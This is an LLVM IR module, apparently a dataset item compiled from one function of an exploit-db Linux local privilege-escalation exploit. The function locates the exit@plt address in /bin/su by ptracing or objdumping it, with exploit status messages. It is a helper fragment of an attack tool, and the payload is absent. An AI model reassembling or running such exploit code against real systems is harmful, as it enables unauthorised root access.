; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35161.c_find_address.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35161.c_find_address.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [66 x i8] c"[+] Ptracing su to find next instruction without reading binary.\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"[-] Ptrace failed.\0A\00", align 1
@.str.2 = private unnamed_addr constant [54 x i8] c"[+] Reading su binary with objdump to find exit@plt.\0A\00", align 1
@ULONG_MAX = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [80 x i8] c"[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\0A\00", align 1
@.str.4 = private unnamed_addr constant [54 x i8] c"[-] Usage: %s -o ADDRESS\0A[-] Example: %s -o 0x402178\0A\00", align 1
@prog_name = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [37 x i8] c"[+] Resolved call address to 0x%lx.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @find_address() #0 {
  %1 = alloca i64, align 8
  %2 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %3 = call i64 (...) @ptrace_address()
  store i64 %3, i64* %1, align 8
  %4 = load i64, i64* %1, align 8
  %5 = icmp ne i64 %4, 0
  br i1 %5, label %23, label %6

6:                                                ; preds = %0
  %7 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.2, i64 0, i64 0))
  %9 = call i64 (...) @objdump_address()
  store i64 %9, i64* %1, align 8
  %10 = load i64, i64* %1, align 8
  %11 = load i64, i64* @ULONG_MAX, align 8
  %12 = icmp eq i64 %10, %11
  br i1 %12, label %16, label %13

13:                                               ; preds = %6
  %14 = load i64, i64* %1, align 8
  %15 = icmp ne i64 %14, 0
  br i1 %15, label %22, label %16

16:                                               ; preds = %13, %6
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.3, i64 0, i64 0))
  %18 = load i8*, i8** @prog_name, align 8
  %19 = load i8*, i8** @prog_name, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.4, i64 0, i64 0), i8* %18, i8* %19)
  %21 = call i32 @exit(i32 -1) #3
  unreachable

22:                                               ; preds = %13
  br label %23

23:                                               ; preds = %22, %0
  %24 = load i64, i64* %1, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0), i64 %24)
  %26 = load i64, i64* %1, align 8
  ret i64 %26
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @ptrace_address(...) #1

declare dso_local i64 @objdump_address(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
